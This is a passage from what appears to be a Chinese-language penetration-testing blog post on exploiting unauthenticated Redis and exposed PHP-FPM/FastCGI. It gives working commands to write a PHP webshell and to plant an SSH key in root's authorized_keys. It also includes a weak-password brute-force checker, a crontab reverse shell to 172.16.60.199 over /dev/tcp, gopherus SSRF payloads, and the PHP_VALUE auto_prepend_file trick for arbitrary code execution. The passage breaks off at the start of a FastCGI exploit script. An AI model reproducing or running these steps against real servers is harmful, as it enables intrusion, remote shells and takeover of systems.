0.0.0.0</li>\n<li>未开启登录验证，没有设置绑定 IP， <code>protected-mode</code>  关闭</li>\n</ol>\n<h4 id=\"利用redis写webshell\"><a class=\"markdownIt-Anchor\" href=\"#利用redis写webshell\">#</a> 利用 Redis 写 webshell</h4>\n<p>通过设置目录后写入备份文件中</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20180829154920415-7768410.png\" alt=\"img\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">xxxxxxxxxx set x &quot;\\n\\n&lt;?php phpinfo();?&gt;\\n\\n&quot;</span><br></pre></td></tr></table></figure>\n<p>用 redis 写入的文件会自带一些版本信息，如果不换行可能会导致无法执行。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">访问redis.php</span><br></pre></td></tr></table></figure>\n<p>或者使用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php </span><br><span class=\"line\">                                                                                                ?&gt;&#x27;);</span><br><span class=\"line\">exit();</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<h4 id=\"使用公钥私钥获取root权限\"><a class=\"markdownIt-Anchor\" href=\"#使用公钥私钥获取root权限\">#</a> 使用公钥私钥获取 root 权限</h4>\n<p>生成公私钥，默认路径为 /root/.ssh</p>\n<p>本地生成私钥和公钥，将公钥写入备份文件，使用本地私钥登录</p>\n<p><code>ssh-keygen -t rsa</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">修改工作路径</span><br><span class=\"line\">config set dir /root/.ssh</span><br><span class=\"line\">config set dbfilename authorized_keys</span><br><span class=\"line\">set pub &quot;我们刚刚生成的公钥&quot;</span><br><span class=\"line\">登录：ssh -i id_rsa root@172.16.60.166</span><br><span class=\"line\">id -&gt; 得到root</span><br></pre></td></tr></table></figure>\n<h4 id=\"redis未授权访问检测脚本\"><a class=\"markdownIt-Anchor\" href=\"#redis未授权访问检测脚本\">#</a> redis 未授权访问检测脚本</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#! /usr/bin/env python</span><br><span class=\"line\"># _*_  coding:utf-8 _*_</span><br><span class=\"line\">import socket</span><br><span class=\"line\">import sys</span><br><span class=\"line\">PASSWORD_DIC=[&#x27;redis&#x27;,&#x27;root&#x27;,&#x27;oracle&#x27;,&#x27;password&#x27;,&#x27;p@aaw0rd&#x27;,&#x27;abc123!&#x27;,&#x27;123456&#x27;,&#x27;admin&#x27;]</span><br><span class=\"line\">def check(ip, port, timeout):</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        socket.setdefaulttimeout(timeout)</span><br><span class=\"line\">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">        s.connect((ip, int(port)))</span><br><span class=\"line\">        s.send(&quot;INFO\\r\\n&quot;)</span><br><span class=\"line\">        result = s.recv(1024)</span><br><span class=\"line\">        if &quot;redis_version&quot; in result:</span><br><span class=\"line\">            return u&quot;未授权访问&quot;</span><br><span class=\"line\">        elif &quot;Authentication&quot; in result:</span><br><span class=\"line\">            for pass_ in PASSWORD_DIC:</span><br><span class=\"line\">                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">                s.connect((ip, int(port)))</span><br><span class=\"line\">                s.send(&quot;AUTH %s\\r\\n&quot; %(pass_))</span><br><span class=\"line\">                result = s.recv(1024)</span><br><span class=\"line\">                if &#x27;+OK&#x27; in result:</span><br><span class=\"line\">                    return u&quot;存在弱口令，密码：%s&quot; % (pass_)</span><br><span class=\"line\">    except Exception, e:</span><br><span class=\"line\">        pass</span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    ip=sys.argv[1]</span><br><span class=\"line\">    port=sys.argv[2]</span><br><span class=\"line\">    print check(ip,port, timeout=10)</span><br></pre></td></tr></table></figure>\n<h4 id=\"利用任务计划反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#利用任务计划反弹shell\">#</a> 利用任务计划反弹 shell</h4>\n<p>攻击者监听端口</p>\n<p><code>nc -lvnp 4444</code></p>\n<p>将备份放入任务计划中，同时将 crontab 内容写入文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set xxx &quot;\\n\\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/172.16.60.199/1234 0&gt;&amp;1\\n\\n&quot;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">config set dir /var/spool/cron </span><br><span class=\"line\">config set dbfilename  root</span><br><span class=\"line\">save</span><br></pre></td></tr></table></figure>\n<p>在反弹的 shell 中可以看数据库连接文件等，同时谁启动的 Redis 反弹就是谁的权限</p>\n<h4 id=\"利用ssrf中curl函数请求redis未授权访问\"><a class=\"markdownIt-Anchor\" href=\"#利用ssrf中curl函数请求redis未授权访问\">#</a> 利用 ssrf 中 curl 函数请求 Redis 未授权访问</h4>\n<p>gopher 协议支持发出 GET、POST 请求：可以先截获 get 请求包和 post 请求包，在构成符合 gopher 协议的请求。gopher 协议是 ssrf 利用中最强大的协议。而 curl_exec 也是 tcp 的因此可以实现</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1nb3BoZXJ1cy11dTdtNTMwMGEucHk=\">利用 gopherus.py</span></p>\n<p>写入 webshell / 反弹 webshell</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python gopherus.py --exploit redis </span><br><span class=\"line\">phpwebshell/reverseshell</span><br><span class=\"line\">需要写入的payload</span><br><span class=\"line\">得到最终的payload</span><br></pre></td></tr></table></figure>\n<p>注意：最后得到的 payload 如果从 url 输入需要二次编码，但使用 curl 命令就不需要</p>\n<p>两次因为 gopher 解码一次，url 解码一次</p>\n<h3 id=\"fastcgifpm未授权访问\"><a class=\"markdownIt-Anchor\" href=\"#fastcgifpm未授权访问\">#</a> FastCGI，FPM 未授权访问</h3>\n<p>前置知识</p>\n<p>1.fastcgi &amp;&amp; fastcgi record</p>\n<p>Fastcgi 其实是一个通信协议，和 HTTP 协议一样，都是进行数据交换的一个通道。</p>\n<p>fastcgi 协议则是服务器中间件和某个语言后端进行数据交换的协议。Fastcgi 协议由多个 record 组成，record 也有 header 和 body 一说，服务器中间件将这二者按照 fastcgi 的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。</p>\n<p>record 组成如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">typedef struct &#123;</span><br><span class=\"line\">  /* Header */</span><br><span class=\"line\">  unsigned char version; // 版本</span><br><span class=\"line\">  unsigned char type; // 本次record的类型</span><br><span class=\"line\">  unsigned char requestIdB1; // 本次record对应的请求id</span><br><span class=\"line\">  unsigned char requestIdB0;</span><br><span class=\"line\">  unsigned char contentLengthB1; // body体的大小</span><br><span class=\"line\">  unsigned char contentLengthB0;</span><br><span class=\"line\">  unsigned char paddingLength; // 额外块大小</span><br><span class=\"line\">  unsigned char reserved; </span><br><span class=\"line\"></span><br><span class=\"line\">  /* Body */</span><br><span class=\"line\">  unsigned char contentData[contentLength];</span><br><span class=\"line\">  unsigned char paddingData[paddingLength];</span><br><span class=\"line\">&#125; FCGI_Record;</span><br></pre></td></tr></table></figure>\n<p>头由 8 个 uchar 类型的变量组成，每个变量 1 字节。其中， <code>requestId</code>  占两个字节，一个唯一的标志 id，以避免多个请求之间的影响； <code>contentLength</code>  占两个字节，表示 body 的大小。</p>\n<p>语言端解析了 fastcgi 头以后，拿到 <code>contentLength</code> ，然后再在 TCP 流里读取大小等于 <code>contentLength</code>  的数据，这就是 body 体。一个 fastcgi record 结构最大支持的 body 大小是 <code>2^16</code> ，也就是 65536 字节。</p>\n<p>2.fastcgi type</p>\n<p><code>type</code>  就是指定该 record 的作用。因为 fastcgi 一个 record 的大小是有限的，作用也是单一的，所以我们需要在一个 TCP 流里传输多个 record。通过 <code>type</code>  来标志每个 record 的作用，用 <code>requestId</code>  作为同一次请求的 id。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/e29518b1-3574-426f-b75f-8cabbb89a15a.9efc537226ce.jpg\" alt=\"14931267923354.jpg\"></p>\n<p>看了这个表格就很清楚了，服务器中间件和后端语言通信，第一个数据包就是 <code>type</code>  为 1 的 record，后续互相交流，发送 <code>type</code>  为 4、5、6、7 的 record，结束时发送 <code>type</code>  为 2、3 的 record。</p>\n<p>3.php fpm</p>\n<p>FPM 其实是一个 fastcgi 协议解析器，Nginx 等服务器中间件将用户请求按照 fastcgi 的规则打包好通过 TCP 传给谁？其实就是传给 FPM。</p>\n<p>用户访问 <code>http://127.0.0.1/index.php?a=1&amp;b=2</code> ，如果 web 目录是 <code>/var/www/html</code> ，那么 Nginx 会将这个请求变成如下 key-value 对：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,</span><br><span class=\"line\">    &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;,</span><br><span class=\"line\">    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;,</span><br><span class=\"line\">    &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;,</span><br><span class=\"line\">    &#x27;QUERY_STRING&#x27;: &#x27;?a=1&amp;b=2&#x27;,</span><br><span class=\"line\">    &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=1&amp;b=2&#x27;,</span><br><span class=\"line\">    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,</span><br><span class=\"line\">    &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,</span><br><span class=\"line\">    &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class=\"line\">    &#x27;REMOTE_PORT&#x27;: &#x27;12345&#x27;,</span><br><span class=\"line\">    &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class=\"line\">    &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,</span><br><span class=\"line\">    &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;,</span><br><span class=\"line\">    &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>PHP-FPM 拿到 fastcgi 的数据包后，进行解析，得到上述这些环境变量。然后，执行 <code>SCRIPT_FILENAME</code>  的值指向的 PHP 文件，也就是 <code>/var/www/html/index.php</code> 。</p>\n<h4 id=\"iis70解析漏洞\"><a class=\"markdownIt-Anchor\" href=\"#iis70解析漏洞\">#</a> IIS7.0 解析漏洞</h4>\n<p>漏洞现象是，在用户访问 <code>http://127.0.0.1/favicon.ico/.php</code>  时，访问到的文件是 favicon.ico，但却按照.php 后缀解析了。</p>\n<p>用户请求 <code>http://127.0.0.1/favicon.ico/.php</code> ，nginx 将会发送如下环境变量到 fpm 里：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/favicon.ico/.php&#x27;,</span><br><span class=\"line\">    &#x27;SCRIPT_NAME&#x27;: &#x27;/favicon.ico/.php&#x27;,</span><br><span class=\"line\">    &#x27;REQUEST_URI&#x27;: &#x27;/favicon.ico/.php&#x27;,</span><br><span class=\"line\">    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>正常来说， <code>SCRIPT_FILENAME</code>  的值是一个不存在的文件 <code>/var/www/html/favicon.ico/.php</code> ，是 PHP 设置中的一个选项 <code>fix_pathinfo</code>  导致了这个漏洞。PHP 为了支持 Path Info 模式而创造了 <code>fix_pathinfo</code> ，在这个选项被打开的情况下，fpm 会判断 <code>SCRIPT_FILENAME</code>  是否存在，如果不存在则去掉最后一个 <code>/</code>  及以后的所有内容，再次判断文件是否存在，往次循环，直到文件存在。</p>\n<p>所以，第一次 fpm 发现 <code>/var/www/html/favicon.ico/.php</code>  不存在，则去掉 <code>/.php</code> ，再判断 <code>/var/www/html/favicon.ico</code>  是否存在。显然这个文件是存在的，于是被作为 PHP 文件执行，导致解析漏洞。</p>\n<p>正确的解决方法有两种，一是在 Nginx 端使用 <code>fastcgi_split_path_info</code>  将 path info 信息去除后，用 tryfiles 判断文件是否存在；二是借助 PHP-FPM 的 <code>security.limit_extensions</code>  配置项，避免其他后缀文件被解析。</p>\n<h4 id=\"fastcgi-未授权访问\"><a class=\"markdownIt-Anchor\" href=\"#fastcgi-未授权访问\">#</a> fastcgi 未授权访问</h4>\n<p><strong>PHP-FPM 默认监听 9000 端口，如果这个端口暴露在公网，则我们可以自己构造 fastcgi 协议，和 fpm 进行通信。</strong></p>\n<p><code>SCRIPT_FILENAME</code>  的值就格外重要了。因为 fpm 是根据这个值来执行 php 文件的，如果这个文件不存在，fpm 会直接返回 404：</p>\n<p>由于设置了 security.limit_extensions，其限定了只有某些后缀的文件允许被 fpm 执行，默认是 <code>.php</code> 。</p>\n<p>由于这个配置项的限制，如果想利用 PHP-FPM 的未授权访问漏洞，首先就得找到一个已存在的 PHP 文件。</p>\n<p>我们可以找找默认源安装后可能存在的 php 文件，比如 <code>/usr/local/lib/php/PEAR.php</code> 。</p>\n<p>PHP.INI 中有两个有趣的配置项， <code>auto_prepend_file</code>  和 <code>auto_append_file</code> 。</p>\n<p><code>auto_prepend_file</code>  是告诉 PHP，在执行目标文件之前，先包含 <code>auto_prepend_file</code>  中指定的文件； <code>auto_append_file</code>  是告诉 PHP，在执行完成目标文件后，包含 <code>auto_append_file</code>  指向的文件。</p>\n<p>那么就有趣了，假设我们设置 <code>auto_prepend_file</code>  为 <code>php://input</code> ，那么就等于在执行任何 php 文件前都要包含一遍 POST 的内容。所以，我们只需要把待执行的代码放在 Body 中，他们就能被执行了。（当然，还需要开启远程文件包含选项 <code>allow_url_include</code> ）</p>\n<p>那么，我们怎么设置 <code>auto_prepend_file</code>  的值？</p>\n<p>这又涉及到 PHP-FPM 的两个环境变量， <code>PHP_VALUE</code>  和 <code>PHP_ADMIN_VALUE</code> 。这两个环境变量就是用来设置 PHP 配置项的， <code>PHP_VALUE</code>  可以设置模式为 <code>PHP_INI_USER</code>  和 <code>PHP_INI_ALL</code>  的选项， <code>PHP_ADMIN_VALUE</code>  可以设置所有选项。（ <code>disable_functions</code>  除外，这个选项是 PHP 加载的时候就确定了，在范围内的函数直接不会被加载到 PHP 上下文中）</p>\n<p>所以，我们最后传入如下环境变量：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,</span><br><span class=\"line\">    &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;,</span><br><span class=\"line\">    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;,</span><br><span class=\"line\">    &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;,</span><br><span class=\"line\">    &#x27;QUERY_STRING&#x27;: &#x27;?a=1&amp;b=2&#x27;,</span><br><span class=\"line\">    &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=1&amp;b=2&#x27;,</span><br><span class=\"line\">    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,</span><br><span class=\"line\">    &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,</span><br><span class=\"line\">    &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class=\"line\">    &#x27;REMOTE_PORT&#x27;: &#x27;12345&#x27;,</span><br><span class=\"line\">    &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class=\"line\">    &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,</span><br><span class=\"line\">    &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;,</span><br><span class=\"line\">    &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;</span><br><span class=\"line\">    &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = php://input&#x27;,</span><br><span class=\"line\">    &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>设置 <code>auto_prepend_file = php://input</code>  且 <code>allow_url_include = On</code> ，然后将我们需要执行的代码放在 Body 中，即可执行任意代码。</p>\n<p>利用脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">import</span> argparse</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">from</span> io <span class=\"keyword\">import</span> BytesIO</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span></span><br><span class=\"line\"></span><br><span class=\"line\">PY2 = <span class=\"literal\">True</span> <span class=\"keyword\">if</span> sys.version_info.major == <span class=\"number\">2</span> <span class=\"keyword\">else</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">bchr</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> PY2:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> force_bytes(<span class=\"built_in\">chr</span>(i))</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">bytes</span>([i])</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">bord</span>(<span class=\"params\">c</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(c, <span class=\"built_in\">int</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> c</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">ord</span>(c)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">force_bytes</span>(<span class=\"params\">s</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(s, <span class=\"built_in\">bytes</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> 